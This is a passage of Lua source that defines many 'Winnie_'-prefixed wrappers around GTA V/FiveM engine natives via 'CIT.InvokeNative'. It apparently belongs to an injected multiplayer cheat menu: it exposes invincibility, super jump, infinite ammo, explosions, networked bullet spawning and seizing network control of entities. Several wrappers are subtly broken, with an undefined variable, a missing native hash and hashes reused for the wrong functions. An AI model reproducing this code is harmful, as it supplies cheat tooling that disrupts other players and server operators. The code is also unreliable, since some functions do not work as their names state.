        z,
        offX,
        offY,
        offZ,
        boneIndex,
        isDirectionRel,
        ignoreUpVec,
        isForceRel,
        p12,
        p13)
        return CIT.InvokeNative(
            0xC5F68BE9613E2D18,
            entity,
            forceType,
            x,
            y,
            z,
            offX,
            offY,
            offZ,
            boneIndex,
            isDirectionRel,
            ignoreUpVec,
            isForceRel,
            p12,
            p13
        )
    end
    function Winnie_RemoveVehicleWindow (vehicle, windowIndex)
        return CIT.InvokeNative(0xA711568EEDB43069, vehicle, windowIndex)
    end
    function Winnie_SetDisableVehicleWindowCollisions (vehicle, toggle)
        return CIT.InvokeNative(0x1087BC8EC540DAEB, vehicle, toggle)
    end
    function Winnie_SetVehicleLights (vehicle, p1)
        return CIT.InvokeNative(0x34E710FF01247C5A, vehicle, p1)
    end
    function Winnie_GetPlayerServerId (player)
        return CIT.InvokeNative(0x4d97bcc7, player, CIT.ReturnResultAnyway(), CIT.ResultAsInteger())
    end
    function Winnie_GetEntityHeading (entity)
        return CIT.InvokeNative(0xE83D4F9BA2A38914, entity, CIT.ReturnResultAnyway(), CIT.ResultAsFloat())
    end
    function Winnie_AttachEntityToEntity (
        entity1,
        entity2,
        boneIndex,
        x,
        y,
        z,
        xRot,
        yRot,
        zRot,
        p9,
        isRel,
        ignoreUpVec,
        allowRotation,
        unk,
        p14)
        return CIT.InvokeNative(
            0x6B9BBD38AB0796DF,
            entity1,
            entity2,
            boneIndex,
            x,
            y,
            z,
            xRot,
            yRot,
            zRot,
            p9,
            isRel,
            ignoreUpVec,
            allowRotation,
            unk,
            p14
        )
    end
    function Winnie_GetVehiclePedIsIn (ped, lastVehicle)
        return CIT.InvokeNative(0x9A9112A0FE9A4713, ped, lastVehicle, CIT.ReturnResultAnyway(), CIT.ResultAsInteger())
    end
    function Winnie_DisableControlAction (padIndex, control, disable)
        return CIT.InvokeNative(0xFE99B66D079CF6BC, padIndex, control, disable)
    end
    function Winnie_HasEntityClearLosToEntity (entity1, entity2, traceType)
        return CIT.InvokeNative(0xFCDFF7B72D23A1AC, entity1, entity2, traceType, CIT.ReturnResultAnyway())
    end
    function Winnie_GetBlipSprite (blip)
        return CIT.InvokeNative(0x1FC877464A04FC4F, blip, CIT.ReturnResultAnyway(), CIT.ResultAsInteger())
    end
    function Winnie_HasModelLoaded (model)
        return CIT.InvokeNative(0x98A4EB5D89A0C952, model, CIT.ReturnResultAnyway())
    end
    function Winnie_SetVehicleBurnout (vehicle, toggle)
        return CIT.InvokeNative(0xFB8794444A7D60FB, vehicle, toggle)
    end
    function Winnie_SetTimecycleModifier (modifierName)
        return CIT.InvokeNative(0x2C933ABF17A1DF41, modifierName)
    end
    function Winnie_CreateCamWithParams (p1, p2, p3, p4, p5, p6, p7, p8, p9, p10)
        return CIT.InvokeNative(
            0xB51194800B257161,
            tostring(p1),
            p2,
            p3,
            p4,
            p5,
            p6,
            p7,
            p8,
            p9,
            p10,
            CIT.ReturnResultAnyway(),
            CIT.ResultAsInteger()
        )
    end
    function Winnie_GetGameTimer()
        return CIT.InvokeNative(0x9CD27B0045628463, CIT.ReturnResultAnyway(), CIT.ResultAsInteger())
    end
    function Winnie_RemoveWeaponFromPed (ped, weaponHash)
        return CIT.InvokeNative(0xF25DF915FA38C5F3, ped, weaponHash, CIT.ResultAsInteger())
    end
    function Winnie_ShootSingleBulletBetweenCoords (
        x1,
        y1,
        z1,
        x2,
        y2,
        z2,
        damage,
        p7,
        weaponHash,
        ownerPed,
        isAudible,
        isInvisible,
        speed)
        return CIT.InvokeNative(
            0x867654CBC7606F2C,
            x1,
            y1,
            z1,
            x2,
            y2,
            z2,
            damage,
            p7,
            weaponHash,
            ownerPed,
            isAudible,
            isInvisible,
            speed
        )
    end
    function Winnie_GetFirstBlipInfoId (blipSprite)
        return CIT.InvokeNative(0x1BEDE233E6CD2A1F, blipSprite, CIT.ReturnResultAnyway(), CIT.ResultAsInteger())
    end
    function Winnie_FreezeEntityPosition (entity, toggle)
        return CIT.InvokeNative(0x428CA6DBD1094446, entity, toggle)
    end
    function Winnie_SetEntityRotation (entity, pitch, roll, yaw, rotationOrder, p5)
        return CIT.InvokeNative(0x8524A8B0171D5E07, entity, pitch, roll, yaw, rotationOrder, p5)
    end
    function Winnie_SetVehicleWindowTint (vehicle, tint)
        return CIT.InvokeNative(0x57C51E6BAD752696, vehicle, tint)
    end
    function Winnie_ReplaceHudColourWithRgba (colorodhudIndex, r, g, b, a)
        return CIT.InvokeNative(0xF314CF4F0211894E, colorodhudIndex, r, g, b, a)
    end
    function Winnie_NetworkResurrectLocalPlayer (p0, p1, p2, p3, p4, p5)
        return CIT.InvokeNative(0xEA23C49EAA83ACFB, p0, p1, p2, p3, p4, p5)
    end
    function Winnie_GetEntityMaxHealth (entity)
        return CIT.InvokeNative(0x15D757606D170C3C, entity)
    end
    function Winnie_IsControlJustPressed (padIndex, control)
        return CIT.InvokeNative(0x580417101DDB492F, padIndex, control, CIT.ReturnResultAnyway())
    end
    function Winnie_IsCreateObject (modelHash, x, y, z, isNetwork, netMissionEntity, dynamic)
        return CIT.InvokeNative(
            0x509D5878EB39E842,
            modelHash,
            x,
            y,
            z,
            isNetwork,
            netMissionEntity,
            dynamic,
            CIT.ReturnResultAnyway(),
            CIT.ResultAsInteger()
        )
    end
    function Winnie_SetEntityCoordsNoOffset (entity, X, Y, Z, p4, p5, p6)
        return CIT.InvokeNative(0x239A3351AC1DA385, entity, X, Y, Z, p4, p5, p6)
    end
    function Winnie_DoesEntityExist (entity)
        return CIT.InvokeNative(0x7239B21A38F536BA, entity, CIT.ReturnResultAnyway())
    end
    function Winnie_GetGameplayCamRelativeHeading()
        return CIT.InvokeNative(0x743607648ADD4587, CIT.ReturnResultAnyway(), CIT.ResultAsFloat())
    end
    function Winnie_IsDisabledControlJustPressed (index, control)
        return CIT.InvokeNative(0x91AEF906BCA88877, index, control, CIT.ReturnResultAnyway())
    end
    function Winnie_CreateCam (camName, p1)
        return CIT.InvokeNative(
            0xC3981DCE61D9E13F,
            tostring(camName),
            p1,
            CIT.ReturnResultAnyway(),
            CIT.ResultAsInteger()
        )
    end
    function Winnie_SetVehicleForwardSpeed (vehicle, speed)
        return CIT.InvokeNative(0xAB54A438726D25D5, vehicle, speed)
    end
    function Winnie_GetGameplayCamRot (rotationOrder)
        return CIT.InvokeNative(0x837765A25378F0BB, rotationOrder, CIT.ReturnResultAnyway(), CIT.ResultAsVector())
    end
    function Winnie_GetVehiclePedIsUsing (ped)
        return CIT.InvokeNative(0x6094AD011A2EA87D, ped, CIT.ReturnResultAnyway(), CIT.ResultAsInteger())
    end
    function Winnie_SetPedArmour (ped, amount)
        return CIT.InvokeNative(0xCEA04D83135264CC, ped, amount, CIT.ResultAsInteger())
    end
    function Winnie_StartShapeTestRay (x1, y1, z1, x2, y2, z2, flags, entity, p8)
        return CIT.InvokeNative(
            0x377906D8A31E5586,
            x1,
            y1,
            z1,
            x2,
            y2,
            z2,
            flags,
            entity,
            p8,
            CIT.ReturnResultAnyway(),
            CIT.ResultAsInteger()
        )
    end
    function Winnie_StatSetInt (p1, p2, p3)
        CIT.InvokeNative(0xB3271D7AB655B441, p1, p2, p3)
    end
    function Winnie_GetGameplayCamCoord()
        return CIT.InvokeNative(0x14D6F5678D8F1B37, CIT.ReturnResultAnyway(), CIT.ResultAsVector())
    end
    function Winnie_SetEntityVelocity (entity, x, y, z)
        return CIT.InvokeNative(0x1C99BB7B6E96D16F, entity, x, y, z)
    end
    function Winnie_GetBlipFromEntity (entity)
        return CIT.InvokeNative(0xBC8DBDCA2436F7E8, entity, CIT.ReturnResultAnyway(), CIT.ResultAsInteger())
    end
    function Winnie_GetPedInVehicleSeat (vehicle, index)
        return CIT.InvokeNative(0xBB40DD2270B65366, vehicle, index, CIT.ReturnResultAnyway(), CIT.ResultAsInteger())
    end
    function Winnie_DisableAllControlActions (a)
        return CIT.InvokeNative(0x5F4B6931816E599B, a)
    end
    function Winnie_GetGameplayCamRelativePitch()
        return CIT.InvokeNative(0x3A6867B4845BEDA2, CIT.ReturnResultAnyway(), CIT.ResultAsFloat())
    end
    function Winnie_SetPedCoordsKeepVehicle (ped, posX, posY, posZ)
        return CIT.InvokeNative(0x9AFEFF481A85AB2E, ped, posX, posY, posZ)
    end
    function Winnie_ClearPedTasksImmediately (ped)
        return CIT.InvokeNative(0xAAA34F8A7CB32098, ped)
    end
    function Winnie_GetGameplayCamFov()
        return CIT.InvokeNative(0x65019750A0324133, CIT.ReturnResultAnyway(), CIT.ResultAsFloat())
    end
    function Winnie_IsPedInAnyVehicle (ped, atGetIn)
        return CIT.InvokeNative(0x997ABD671D25CA0B, ped, atGetIn, CIT.ReturnResultAnyway())
    end
    function Winnie_IsControlPressed (padIndex, control)
        return CIT.InvokeNative(0xF3A21BCD95725A4A, padIndex, control)
    end
    function Winnie_DisplayOnscreenKeyboard (
        p0,
        windowTitle,
        p2,
        defaultText,
        defaultConcat1,
        defaultConcat2,
        defaultConcat3,
        maxInputLength)
        return CIT.InvokeNative(
            0x00DC833F2568DBF6,
            p0,
            tostring(windowTitle),
            tostring(p2),
            tostring(defaultText),
            tostring(defaultConcat1),
            tostring(defaultConcat2),
            tostring(defaultConcat3),
            maxInputLength
        )
    end
    function Winnie_NetworkRequestControlOfEntity (entity)
        return CIT.InvokeNative(0xB69317BF5E782347, entity, CIT.ReturnResultAnyway())
    end
    function Winnie_SetEntityAlpha (entity, alphaLevel, skin)
        return CIT.InvokeNative(0x44A0870B7E92D7C0, entity, alphaLevel, skin)
    end
    function Winnie_CreatePed (pedType, modelHash, x, y, z, heading, isNetwork, thisScriptCheck)
        return CIT.InvokeNative(
            0xD49F9B0955C367DE,
            pedType,
            modelHash,
            x,
            y,
            z,
            heading,
            isNetwork,
            thisScriptCheck,
            CIT.ReturnResultAnyway(),
            CIT.ResultAsInteger()
        )
    end
    function Winnie_SetPedMoveRateOverride (ped, value)
        return CIT.InvokeNative(0x085BF80FA50A39D1, ped, value)
    end
    function Winnie_ResetPlayerStamina (player)
        return CIT.InvokeNative(0xA6F312FCCE9C1DFE, player)
    end
    function Winnie_SetSeethrough (toggle)
        return CIT.InvokeNative(0x7E08924259E08CE0, toggle)
    end
    function Winnie_SetNetworkIdCanMigrate (netId, toggle)
        return CIT.InvokeNative(0x299EEB23175895FC, netId, toggle)
    end
    function Winnie_GetPlayerName (playerSrc)
        return CIT.InvokeNative(0x6D0DE6A7B5DA71F8, playerSrc, CIT.ResultAsString())
    end
    function Winnie_SetRunSprintMultiplierForPlayer (player, multiplier)
        return CIT.InvokeNative(0x6DB47AA77FD94E09, player, multiplier)
    end
    function Winnie_SetPedToRagdoll (ped, time1, time2, ragdollType, p4, p5, p6)
        return CIT.InvokeNative(0xAE99FB955581844A, ped, time1, time2, ragdollType, p4, p5, p6)
    end
    function Winnie_AddTextEntry(entryKey, entryText)
        return CIT.InvokeNative(0x32ca01c3, tostring(entryKey), tostring(entryText))
    end
    function Winnie_HasNamedPtfxAssetLoaded (assetName)
        return CIT.InvokeNative(0x8702416E512EC454, tostring(assetName), CIT.ReturnResultAnyway())
    end
    function Winnie_UseParticleFxAsset (name)
        return CIT.InvokeNative(0x6C38AF3693A69A91, tostring(name))
    end
    function Winnie_GetBlipInfoIdCoord (blip)
        return CIT.InvokeNative(0xFA7C7F0AADF25D09, blip, CIT.ReturnResultAnyway(), CIT.ResultAsVector())
    end
    function Winnie_RequestNamedPtfxAsset (name)
        return CIT.InvokeNative(0xB80D8756B4668AB6, tostring(assetName))
    end
    function Winnie_SetEntityVisible (p0, p1, p2)
        return CIT.InvokeNative(0xEA1C610A04DB6BBB, p0, p1, p2)
    end
    function Winnie_UpdateOnscreenKeyboard()
        return CIT.InvokeNative(0x0CF2B696BBF945AE, CIT.ReturnResultAnyway(), CIT.ResultAsInteger())
    end
    function Winnie_IsAimCamActive()
        return CIT.InvokeNative(0x68EDDA28A5976D07)
    end
    function Winnie_GetOnscreenKeyboardResult()
        return CIT.InvokeNative(0x8362B09B91893647, CIT.ResultAsString(), CIT.ResultAsString())
    end
    function Winnie_IsVehicleSeatFree (vehicle, seatIndex)
        return CIT.InvokeNative(0x22AC59A870E6A669, vehicle, seatIndex, CIT.ReturnResultAnyway())
    end
    function Winnie_TaskWarpPedIntoVehicle (ped, vehicle, seat)
        return CIT.InvokeNative(0x9A7D091411C5F684, ped, vehicle, seat)
    end
    function Winnie_StartNetworkedParticleFxNonLoopedAtCoord (
        effectName,
        xPos,
        yPos,
        zPos,
        xRot,
        yRot,
        zRot,
        scale,
        xAxis,
        yAxis,
        zAxis)
        return CIT.InvokeNative(
            0xF56B8137DF10135D,
            tostring(effectName),
            xPos,
            yPos,
            zPos,
            xRot,
            yRot,
            zRot,
            scale,
            xAxis,
            yAxis,
            zAxis,
            CIT.ReturnResultAnyway()
        )
    end
    function Winnie_GetEntityModel (entity)
        return CIT.InvokeNative(0x9F47B058362C84B5, entity, CIT.ReturnResultAnyway(), CIT.ResultAsInteger())
    end
    function Winnie_IsEntityAPed (player)
        return CIT.InvokeNative(0x524AC5ECEA15343E, player)
    end
    function Winnie_SetFakeWantedLevel (fakeWantedLevel)
        return CIT.InvokeNative(0x1454F2448DE30163, fakeWantedLevel)
    end
    function Winnie_GetVehicleMaxNumberOfPassengers (vehicle)
        return CIT.InvokeNative(0xA7C4F2C6E744A550, vehicle, CIT.ReturnResultAnyway(), CIT.ResultAsInteger())
    end
    function Winnie_DestroyDui(p1)
        return CIT.InvokeNative(0xa085cb10, p1)
    end
    function Winnie_IsEntityAVehicle (vehicle)
        return CIT.InvokeNative(0x6AC7003FA6E5575E, vehicle)
    end
    function Winnie_SetVehicleCustomPrimaryColour (vehicle, r, g, b)
        return CIT.InvokeNative(0x7141766F91D15BEA, vehicle, r, g, b, CIT.ResultAsInteger())
    end
    function Winnie_IsEntityAnObject (object)
        return CIT.InvokeNative(0x8D68C8FD0FACA94E, object)
    end
    function Winnie_DeleteEntity (entity)
        return CIT.InvokeNative(0xAE3CBE5BF394C9C9, CIT.PointerValueIntInitialized(entity))
    end
    function Winnie_DoesBlipExist (blip)
        return CIT.InvokeNative(0xA6DB27D19ECBB7DA, blip, CIT.ReturnResultAnyway())
    end
    function Winnie_SetVehicleFixed (vehicle)
        return CIT.InvokeNative(0x115722B1B9C14C1C, vehicle)
    end
    function Winnie_SetFocusPosAndVel (x, y, z, offsetX, offsetY, offsetZ)
        return CIT.InvokeNative(0xBB7454BAFF08FE25, x, y, z, offsetX, offsetY, offsetZ)
    end
    function Winnie_TaskLeaveVehicle (ped, vehicle, flags)
        return CIT.InvokeNative(0xD3DBCE61A490BE02, ped, vehicle, flags)
    end
    function Winnie_GetUtcTime()
        return CIT.InvokeNative(0x8117E09A19EEF4D3)
    end
    function Winnie_SetVehicleReduceGrip (vehicle, toggle)
        return CIT.InvokeNative(0x222FF6A823D122E2, vehicle, toggle)
    end
    function Winnie_IsEntityDead (entity)
        return CIT.InvokeNative(0x5F9532F3B5CC2551, entity, CIT.ReturnResultAnyway())
    end
    function Winnie_SetDrawOrigin (x, y, z, p3)
        return CIT.InvokeNative(0xAA0008F3BBB8F416, x, y, z, p3)
    end
    function Winnie_SetVehicleCustomSecondaryColour (vehicle, r, g, b)
        return CIT.InvokeNative(0x36CED73BFED89754, vehicle, r, g, b, CIT.ResultAsInteger())
    end
    function Winnie_SetPedCapsule (player, value)
        return CIT.InvokeNative(0x364DF566EC833DE2, player, value)
    end
    function Winnie_IsPedRagdoll (ped)
        return CIT.InvokeNative(0x47E4E977581C5B55, ped)
    end
    function Winnie_NetworkGetNetworkIdFromEntity (entity)
        return CIT.InvokeNative(0xA11700682F3AD45C, entity, CIT.ReturnResultAnyway(), CIT.ResultAsInteger())
    end
    function Winnie_DrawLightWithRangeAndShadow (x, y, z, r, g, b, range, intensity, shadow)
        return CIT.InvokeNative(0xF49E9A9716A04595, x, y, z, r, g, b, range, intensity, shadow)
    end
    function Winnie_BeginTextCommandDisplayText (text)
        return CIT.InvokeNative(0x25FBB336DF1804CB, tostring(text))
    end
    function Winnie_IsEntityOnScreen (entity)
        return CIT.InvokeNative(0xE659E47AF827484B, entity, CIT.ReturnResultAnyway())
    end
    function Winnie_IsDisabledControlReleased (inputGroup, control)
        return CIT.InvokeNative(0xFB6C4072E9A32E92, inputGroup, control, CIT.ReturnResultAnyway())
    end
    function Winnie_GetDistanceBetweenCoords (x1, y1, z1, x2, y2, z2, unknown)
        return CIT.InvokeNative(
            0xF1B760881820C952,
            x1,
            y1,
            z1,
            x2,
            y2,
            z2,
            unknown,
            CIT.ReturnResultAnyway(),
            CIT.ResultAsFloat()
        )
    end
    function Winnie_GetFinalRenderedCamCoord()
        return CIT.InvokeNative(0xA200EB1EE790F448, CIT.ResultAsVector())
    end
    function Winnie_GetPedBoneCoords (ped, boneId, offsetX, offsetY, offsetZ)
        return CIT.InvokeNative(
            0x17C07FC640E86B4E,
            ped,
            boneId,
            offsetX,
            offsetY,
            offsetZ,
            CIT.ReturnResultAnyway(),
            CIT.ResultAsVector()
        )
    end
    function Winnie_AddTextComponentSubstringPlayerName (text)
        return CIT.InvokeNative(0x6C188BE134E074AA, tostring(text))
    end
    function Winnie_GetEntityBoneIndexByName (entity, boneName)
        return CIT.InvokeNative(0xFB71170B7E76ACBA, entity, boneName)
    end
    function Winnie_AddTextComponentSubstringWebsite (text)
        return CIT.InvokeNative(0x94CF4AC034C9C986, tostring(text))
    end
    function Winnie_PlayerId()
        return CIT.InvokeNative(0x4F8644AF03D0E0D6, CIT.ReturnResultAnyway(), CIT.ResultAsInteger())
    end
    function Winnie_GetNuiCursorPosition()
        return CIT.InvokeNative(0xbdba226f, CIT.PointerValueInt(), CIT.PointerValueInt())
    end
    function Winnie_SetVehicleFuelLevel (vehicle, level)
        return CIT.InvokeNative(0xba970511, vehicle, level)
    end
    function Winnie_SetPedAmmo (ped, weaponHash, ammo)
        return CIT.InvokeNative(0x14E56BC5B5DB6A19, ped, weaponHash, ammo, CIT.ResultAsInteger())
    end
    function Winnie_SetSuperJumpThisFrame (player)
        return CIT.InvokeNative(0x57FFF03E423A4C0B, player)
    end
    function Winnie_IsDisabledControlJustReleased (a, b)
        return CIT.InvokeNative(0x305C8DCD79DA8B0F, a, b, CIT.ReturnResultAnyway())
    end
    function Winnie_SetEntityInvincible (ped, toggle)
        return CIT.InvokeNative(0x3882114BDE571AD4, ped, toggle)
    end
    function Winnie_SetTextJustification (Justification)
        return CIT.InvokeNative(0x4E096588B13FFECA, Justification)
    end
    function  Winnie_GetCamMatrix (camera)
        return CIT.InvokeNative(
            0x8F57A89D,
            camera,
            CIT.PointerValueVector(),
            CIT.PointerValueVector(),
            CIT.PointerValueVector(),
            CIT.PointerValueVector()
        )
    end
    function Winnie_SetCamFov (cam, fieldOfView)
        return CIT.InvokeNative(0xB13C14F66A00D047, cam, fieldOfView)
    end
    function Winnie_SetVehicleEnginePowerMultiplier (vehicle, value)
        return CIT.InvokeNative(0x93A3996368C94158, vehicle, value)
    end
    function Winnie_SetEntityCoords (entity, xPos, yPos, zPos, xAxis, yAxis, zAxis, clearArea)
        return CIT.InvokeNative(0x06843DA7060A026B, entity, xPos, yPos, zPos, xAxis, yAxis, zAxis, clearArea)
    end
    function Winnie_GetVehicleColor (vehicle)
        return CIT.InvokeNative(vehicle)
    end
    function Winnie_GetEntityCoords (entity, alive)
        return CIT.InvokeNative(0x3FEF770D40960D5A, entity, alive, CIT.ReturnResultAnyway(), CIT.ResultAsVector())
    end
    function Winnie_SetTextFont (font)
        return CIT.InvokeNative(0x66E0276CC5F6B9DA, font)
    end
    function Winnie_SetTextScale (scale, scale1)
        return CIT.InvokeNative(0x07C837F9A01C34C9, scale, scale1)
    end
    function Winnie_SetTextCentre (align)
        return CIT.InvokeNative(0xC02F4DBFB51D988B, align)
    end
    function TaskCombatPed (ped, targetPed, p2, p3)
        return CIT.InvokeNative(0xF166E48407BAC484, ped, targetPed, p2, p3)
    end
    function GetNumVehicleMods (vehicle, modType)
        return CIT.InvokeNative(0xE38E9162A2500646, vehicle, modType, CIT.ReturnResultAnyway(), CIT.ResultAsInteger())
    end
    function Winnie_SetTextColour (r, g, b, a)
        return CIT.InvokeNative(0xBE6B23FFA53FB442, r, g, b, a)
    end
    function Winnie_IsDisabledControlPressed (a, b)
        return CIT.InvokeNative(0xE2587F8CBBD87B1D, a, b, CIT.ReturnResultAnyway())
    end
    function Winnie_GetCamCoord (cam)
        return CIT.InvokeNative(0xBAC038F7459AE5AE, cam, CIT.ReturnResultAnyway(), CIT.ResultAsVector())
    end
    function Winnie_BeginTextCommandWidth (text)
        return CIT.InvokeNative(0x54CE8AC98E120CAB, tostring(text))
    end
    function Winnie_EndTextCommandGetWidth (font)
        return CIT.InvokeNative(0x85F061DA64ED2F67, font, CIT.ResultAsFloat())
    end
    function Winnie_GetPedLastWeaponImpactCoord (ped, coords)
        return CIT.InvokeNative(0x6C4D0409BA1A2BC2, ped, CIT.PointerValueVector(), CIT.ReturnResultAnyway())
    end
    function Winnie_HasStreamedTextureDictLoaded (dict)
        return CIT.InvokeNative(0x0145F696AAAAD2E4, tostring(dict), CIT.ReturnResultAnyway())
    end
    function Winnie_RequestStreamedTextureDict (dict)
        return CIT.InvokeNative(0xDFA2EF8E04127DD5, tostring(dict))
    end
    function Winnie_SetPedInfiniteAmmoClip (ped, toggle)
        return CIT.InvokeNative(0x183DADC6AA953186, ped, toggle)
    end
    function Winnie_DrawSprite (dict, name, x, y, w, h, heading, r, g, b, a)
        return CIT.InvokeNative(0xE7FFAE5EBF23D890, tostring(dict), tostring(name), x, y, w, h, heading, r, g, b, a)
    end
    function Winnie_GetDisplayNameFromVehicleModel (modelHash)
        return CIT.InvokeNative(0xB215AAC32D25D019, modelHash, CIT.ResultAsString())
    end
    function Winnie_SetNightvision (toggle)
        return CIT.InvokeNative(0x18F621F7A5B1F85D, toggle)
    end
    function Winnie_NetworkHasControlOfEntity (entity)
        return CIT.InvokeNative(0x01BF60A500E28887, entity, CIT.ReturnResultAnyway())
    end
    function Winnie_GetScreenCoordFromWorldCoord (worldX, worldY, worldZ)
        return CIT.InvokeNative(
            0x34E82F05DF2974F5,
            worldX,
            worldY,
            worldZ,
            CIT.PointerValueFloat(),
            CIT.PointerValueFloat(),
            CIT.ReturnResultAnyway()
        )
    end
    function Winnie_GetPedBoneIndex (ped, boneId)
        return CIT.InvokeNative(0x3F428D08BE5AAE31, ped, boneId, CIT.ReturnResultAnyway(), CIT.ResultAsInteger())
    end
    function Winnie_SetVehicleDirtLevel (vehicle, dirtLevel)
        return CIT.InvokeNative(0x79D3B596FE44EE8B, vehicle, dirtLevel)
    end
    function Winnie_RequestModel (model)
        return CIT.InvokeNative(0x963D27A58DF860AC, model)
    end
    function Winnie_AddExplosion (x, y, z, explosionType, damageScale, isAudible, isInvisible, cameraShake)
        return CIT.InvokeNative(0xE3AD2BDBAEE269AC, x, y, z, explosionType, damageScale, isAudible, isInvisible, cameraShake)
    end
    function Winnie_GetDuiHandle (duiObject)
        return CIT.InvokeNative(0x1655d41d, duiObject, CIT.ReturnResultAnyway(), CIT.ResultAsString())
    end
    function Winnie_GiveWeaponToPed (ped, weaponHash, ammoCount, p4, equipNow)
        return CIT.InvokeNative(0xBF0FD6E56C964FCB, ped, weaponHash, ammoCount, p4, equipNow)
    end
    function Winnie_DeletePed (entity)
        return CIT.InvokeNative(0x9614299DCB53E54B, CIT.PointerValueIntInitialized(entity))
    end
    function Winnie_GetEntityPlayerIsFreeAimingAt (player, entity)
        return CIT.InvokeNative(
            0x2975C866E6713290,
            player,
            CIT.PointerValueIntInitialized(entity),
            CIT.ReturnResultAnyway()
        )
    end
    function Winnie_GetEntityType (entity)
        return CIT.InvokeNative(0x8ACD366038D14505, entity)
    end
    function Winnie_GetPedArmour (ped)
        return CIT.InvokeNative(0x9483AF821605B1D8, ped, CIT.ReturnResultAnyway(), CIT.ResultAsInteger())
    end
    function Winnie_SetVehicleDoorOpen (vehicle, doorIndex, loose, openInstantly)
        return CIT.InvokeNative(0x7C65DAC73C35C862, vehicle, doorIndex, loose, openInstantly)
    end
    function Winnie_SetVehicleDoorShut (vehicle, doorIndex, closeInstantly)
        return CIT.InvokeNative(0x93D9BD300D7789E5, vehicle, doorIndex, closeInstantly)
    end
    function Winnie_RopeDrawShadowEnabled (worldX, worldY, worldZ)
        return CIT.InvokeNative(
            0x34E82F05DF2974F5,
            worldX,
            worldY,
            worldZ,
            CIT.PointerValueFloat(),
            CIT.PointerValueFloat(),
            CIT.ReturnResultAnyway()
        )
    end
    function Winnie_SetEntityCollision (entity, toggle, keepPhysics)
        return CIT.InvokeNative(0x1A9205C1B9EE827F, entity, toggle, keepPhysics)
    end
    function Winnie_SetPedIntoVehicle (ped, vehicle, seatIndex)
        return CIT.InvokeNative(0xF75B0D629E1C063D, ped, vehicle, seatIndex)
    end
    function Winnie_SetVehicleModKit (vehicle, modKit)
        return CIT.InvokeNative(0x1F2AA07F00B3217A, vehicle, modKit)
    end
    function Winnie_CreateRuntimeTxd (name)
        return CIT.InvokeNative(0x1f3ac778, tostring(name), CIT.ReturnResultAnyway(), CIT.ResultAsLong())
    end
    function Winnie_IsPedShooting (ped)
        return CIT.InvokeNative(0x34616828CD07F1A1, ped, CIT.ReturnResultAnyway())
    end
    function Winnie_IsPedDeadOrDying (ped, p1)
        return CIT.InvokeNative(0x3317DEDB88C95038, ped, p1, CIT.ReturnResultAnyway())
    end
    function Winnie_SetEntityHealth (entity, health)
        return CIT.InvokeNative(0x6B76DC1F3AE6E6A3, entity, health)
    end
    function Winnie_StopScreenEffect (effectName)
        return CIT.InvokeNative(0x068E835A1D0DC0E3, tostring(effectName))
    end
    function Winnie_AddBlipForEntity (entity)
        return CIT.InvokeNative(0x5CDE92C702A8FCE7, entity, CIT.ReturnResultAnyway(), CIT.ResultAsInteger())
    end
    function Winnie_SetVehicleMod (vehicle, modType, modIndex, customTires)
        return CIT.InvokeNative(0x6AF0636DDEDCB6DD, vehicle, modType, modIndex, customTires)
    end
    function Winnie_ShowHeadingIndicatorOnBlip (blip, toggle)
        return CIT.InvokeNative(0x5FBCA48327B914DF, blip, toggle)
    end
    function Winnie_HideNumberOnBlip (blip)
        return CIT.InvokeNative(0x532CFF637EF80148, blip)
    end
    function Winnie_SetBlipScale (blip, scale)
        return CIT.InvokeNative(0xD38744167B2FA257, blip, scale)
    end
    function Winnie_SetBlipRotation (blip, rotation)
        return CIT.InvokeNative(0xF87683CDF73C3F6E, blip, rotation)
    end
    function Winnie_SetBlipAlpha (blip, alpha)
        return CIT.InvokeNative(0x45FF974EEE1C8734, blip, alpha)
    end
    function Winnie_SetBlipNameToPlayerName (blip, player)
        return CIT.InvokeNative(0x127DE7B20C60A6A3, blip, player)
    end
    function Winnie_PlayerPedId()
        return CIT.InvokeNative(0xD80958FC74E988A6, CIT.ReturnResultAnyway(), CIT.ResultAsInteger())
    end
    function Winnie_GetPlayerPed (id)
        return CIT.InvokeNative(0x43A66C31C68491C0, id, CIT.ReturnResultAnyway(), CIT.ResultAsInteger())
    end
    function Winnie_GetSelectedPedWeapon (ped)
        return CIT.InvokeNative(0x0A6DB4965674D243, ped, CIT.ReturnResultAnyway(), CIT.ResultAsInteger())
    end
    function Winnie_GetHashKey (string)
        return CIT.InvokeNative(0xD24D37CC275948CC, tostring(string), CIT.ReturnResultAnyway(), CIT.ResultAsInteger())
    end
    function Winnie_SetTextProportional (p0)
        return CIT.InvokeNative(0x038C1F517D7FDCF8, p0)
    end
    function Winnie_SetTextDropShadow (distance, r, g, b, a)
        return CIT.InvokeNative(0x465C84BC39F1C351, distance, r, g, b, a)
    end
    function Winnie_ClearTimecycleModifier()
        return CIT.InvokeNative(0x0F07E7745A236711)
    end
    function Winnie_SetTextEdge (p0, r, g, b, a)
        return CIT.InvokeNative(0x441603240D202FA6, p0, r, g, b, a)
    end
    function Winnie_SetTextOutline()
        return CIT.InvokeNative(0x2513DFB0FB8400FE)
    end
    function Winnie_SetTextEntry (text)
        return CIT.InvokeNative(0x25FBB336DF1804CB, tostring(text))
    end
    function Winnie_DrawText (x, y)
        return CIT.InvokeNative(0xCD015E5BB0D96A57, x, y)
    end
    function Winnie_DoesCamExist (cam)
        return CIT.InvokeNative(0xA7A932170592B50E, cam, CIT.ReturnResultAnyway())
    end
    function Winnie_GetCamRot (cam, rotationOrder)
        return CIT.InvokeNative(
            0x7D304C1C955E3E12,
            cam,
            rotationOrder,
            CIT.ReturnResultAnyway(),
            CIT.ResultAsVector()
        )
    end
    function Winnie_GetShapeTestResult (rayHandle)
        return CIT.InvokeNative(
            0x3D87450E15D98694,
            rayHandle,
            CIT.PointerValueInt(),
            CIT.PointerValueVector(),
            CIT.PointerValueVector(),
            CIT.PointerValueInt(),
            CIT.ReturnResultAnyway(),
            CIT.ResultAsInteger()
        )
    end
    function Winnie_ClearDrawOrigin()
        return CIT.InvokeNative(0xFF0B610F6BE0D7AF)
    end
    function Winnie_RemoveAllPedWeapons (ped, p1)
        return CIT.InvokeNative(0xF25DF915FA38C5F3, ped, p1, CIT.ResultAsInteger())
    end
    function Winnie_SetVehicleWheelType (vehicle, WheelType)
        return CIT.InvokeNative(
            0x487EB21CC7295BA1,
            vehicle,
            WheelType,
            CIT.ReturnResultAnyway(),
            CIT.ResultAsInteger()
        )
    end
    function Winnie_AddAmmoToPed (ped, weaponHash, ammo)
        return CIT.InvokeNative(0x78F0424C34306220, ped, weaponHash, ammo)
    end
    function Winnie_GetNumResources()
        return CIT.InvokeNative(0x863f27b, CIT.ReturnResultAnyway(), CIT.ResultAsInteger())
    end
    function Winnie_AddTextComponentString (text)
